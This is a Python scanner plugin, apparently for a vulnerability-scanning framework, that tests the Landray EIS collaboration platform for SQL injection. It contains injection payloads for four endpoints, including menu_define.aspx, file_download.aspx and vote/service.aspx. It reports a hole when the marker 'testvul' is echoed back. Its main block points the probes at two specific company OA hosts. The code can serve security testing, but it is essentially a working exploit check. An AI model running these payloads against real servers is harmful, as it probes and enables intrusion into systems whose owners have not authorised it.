#!/usr/bin/env python
# -*- coding: utf-8 -*
# 蓝凌EIS智慧协同平台四处SQL注入
def assign(service, arg):
    if service == 'landray':
        return True, arg
        
def audit(arg):
    payloads = [
    "sm/menu_define.aspx?id=1%20and%201=(select+%27test%27%2b%27vul%27)",

    "webdoc/file_download.aspx?guid=19e789719ac343679c070110c147290e'%20and%201=CONVERT(int,%27test%27%2b%27vul%27)--",

    "webdoc/HtmlSignatureServer.aspx?DocumentID=1'%20and%201=CONVERT(int,%27test%27%2b%27vul%27)--&SignatureID=1&Signature=1&COMMAND=SHOWSIGNATURE"

    
    ]
    for payload in payloads :
        code,_,res,_,_ = curl.curl2(arg+payload)
        if 'testvul' in res :
            security_hole(arg+payload)
    vul_url = arg +"vote/service.aspx"
    payload = "action=voteid&ID=1'+and+1=CONVERT(int,%27test%27%2b%27vul%27)--"
    code,_,res,_,_ = curl.curl2(vul_url,payload)
    if 'testvul' in res:
        security_hole(vul_url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('landray','http://oa.hejiangroup.com/')[1])
    audit(assign('landray','http://oa.geheng.com:800/')[1])